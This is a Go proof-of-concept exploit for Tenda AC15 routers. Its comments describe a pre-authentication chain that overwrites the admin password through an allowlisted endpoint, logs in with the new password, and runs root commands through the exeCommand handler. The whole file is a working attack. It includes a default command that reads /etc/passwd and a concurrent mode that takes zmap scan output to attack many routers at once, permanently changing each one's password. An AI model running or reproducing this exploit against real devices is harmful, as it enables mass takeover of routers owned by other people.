// Tenda AC15 httpd pre-auth admin takeover -> root command execution PoC
//
// 1. POST /goform/fast_setting_wifi_set is allowlisted in R7WebsSecurityHandler
//    (0x2F194) and reachable with zero credentials on default-state routers
// 2. the handler runs SetValue("sys.userpass", loginPwd) followed by
//    sub_2ED88(1), which reloads the live g_Pass global from flash config:
//    instant, persistent admin password overwrite, no memory corruption
// 3. POST /login/Auth with the new password returns the session cookie
// 4. POST /goform/exeCommand pastes cmdinput into system() via doSystemCmd
//    and echoes /tmp/cmdTmp.txt back -> root command execution with output
//
// build: go build tenda-ac15-poc.go

package main

import (
	"bufio"
	"crypto/rand"
	"flag"
	"fmt"
	"io"
	"math/big"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	passwordLength = 16
	defaultWorkers = 20
	readTimeout    = 10 * time.Second
)

var (
	host    = flag.String("host", "", "router address (empty: stream ip:port targets from stdin, e.g. zmap -p 80 -q | ./poc)")
	port    = flag.String("port", "80", "router web port used for stdin targets without an explicit port")
	command = flag.String("cmd", "cat /etc/passwd", "root command to execute")
	workers = flag.Int("workers", defaultWorkers, "concurrent targets in stdin mode")
)

var passwordCharset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

func randomPassword(n int) string {
	raw := make([]byte, n)
	for i := range raw {
		idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(passwordCharset))))
		raw[i] = passwordCharset[idx.Int64()]
	}
	return string(raw)
}

func newClient() *http.Client {
	jar, _ := cookiejar.New(nil)
	return &http.Client{Jar: jar, Timeout: readTimeout}
}

func postForm(c *http.Client, base, path, body string) string {
	resp, err := c.Post(base+path, "application/x-www-form-urlencoded", strings.NewReader(body))
	if err != nil {
		return "ERR: " + err.Error()
	}
	defer resp.Body.Close()
	data, _ := io.ReadAll(resp.Body)
	return string(data)
}

// attackHost runs the full chain: pre-auth password overwrite -> login ->
// exeCommand. The return value is the raw response of the last stage.
func attackHost(base, pass, cmd string) string {
	c := newClient()
	postForm(c, base, "/goform/fast_setting_wifi_set", "loginPwd="+url.QueryEscape(pass))
	postForm(c, base, "/login/Auth", url.Values{"username": {"admin"}, "password": {pass}}.Encode())
	return postForm(c, base, "/goform/exeCommand", "cmdinput="+url.QueryEscape(cmd))
}

func classify(body string) string {
	trimmed := strings.TrimSpace(body)
	switch {
	case trimmed == "ERR: dial tcp: connection refused" || strings.HasPrefix(trimmed, "ERR:"):
		return "[-] " + trimmed
	case strings.Contains(body, "login.html"):
		return "[-] not authenticated: takeover failed (device is configured, see README for the F1 overflow route)"
	case trimmed == "1":
		return "[-] login rejected"
	case strings.Contains(body, "{\"errCode\""):
		return "[*] goform answered but no shell output: " + trimmed
	case trimmed == "":
		return "[*] command produced no stdout (try -cmd 'ls /')"
	default:
		return "[+] root output:\n" + body
	}
}

var printLock sync.Mutex

func worker(base, cmd string, wg *sync.WaitGroup, sem chan struct{}) {
	defer wg.Done()
	out := classify(attackHost(base, randomPassword(passwordLength), cmd))
	printLock.Lock()
	fmt.Printf("=== %s ===\n%s\n", base, out)
	printLock.Unlock()
	<-sem
}

func main() {
	flag.Parse()
	if *host != "" {
		base := "http://" + *host
		if !strings.Contains(*host, ":") {
			base += ":" + *port
		}
		fmt.Printf("Tenda AC15 pre-auth takeover PoC\ntarget: %s\n\n", base)
		fmt.Println(classify(attackHost(base, randomPassword(passwordLength), *command)))
		return
	}

	sem := make(chan struct{}, *workers)
	var wg sync.WaitGroup
	scanner := bufio.NewScanner(os.Stdin)
	scanner.Buffer(make([]byte, 1024*1024), 1024*1024)
	for scanner.Scan() {
		target := strings.TrimSpace(scanner.Text())
		if target == "" || strings.HasPrefix(target, "#") {
			continue
		}
		if !strings.Contains(target, ":") {
			target += ":" + *port
		}
		wg.Add(1)
		sem <- struct{}{}
		go worker("http://"+target, *command, &wg, sem)
	}
	wg.Wait()
}
